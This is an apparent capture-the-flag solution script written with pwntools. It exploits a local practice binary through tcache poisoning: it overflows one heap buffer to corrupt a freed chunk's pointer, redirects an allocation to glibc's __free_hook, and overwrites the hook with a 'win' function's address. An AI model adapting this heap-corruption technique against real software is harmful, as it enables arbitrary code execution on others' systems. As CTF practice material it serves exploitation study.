from pwn import *

context.terminal = ["tmux", "splitw", "-h"]

elf = ELF("./chall")

#p = gdb.debug(elf.path,'''
#	break main
#	continue
#''')
p = process(elf.path)

p.recvuntil(" <__free_hook>: ")
free_hook_addr = int(p.recvline()[:-1].decode(),16)
log.info("free_hook_addr = " + hex(free_hook_addr))
p.recvuntil(" <win>: ")
win_addr = int(p.recvline()[:-1].decode(),16)
log.info("win_addr = " + hex(win_addr))

# 2. B = malloc(0x18); read(0, B, 0x18);
p.recvuntil("\n> ")
p.sendline("2")
p.sendline(b"bbbb")


# 3. free(B); B = NULL;
p.recvuntil("\n> ")
p.sendline("3")

# 1. read(0, A, 0x80); A<- 'a' * 24 + p64(0x31) + p64(0x0000555555758360)
p.recvuntil("\n> ")
p.sendline("1")
buf = b'a' * 24
buf += p64(0x31)
buf += p64(free_hook_addr)
p.sendline(buf)

# 3. free(B); B = NULL;
p.recvuntil("\n> ")
p.sendline("3")

# 2. B = malloc(0x18); read(0, B, 0x18);
p.recvuntil("\n> ")
p.sendline("2")
p.sendline(b"bbbb")

# 3. free(B); B = NULL;
p.recvuntil("\n> ")
p.sendline("3")

# 2. B = malloc(0x18); read(0, B, 0x18);
p.recvuntil("\n> ")
p.sendline("2")
p.sendline(p64(win_addr))

# 3. free(B); B = NULL;
p.recvuntil("\n> ")
p.sendline("3")

p.interactive()

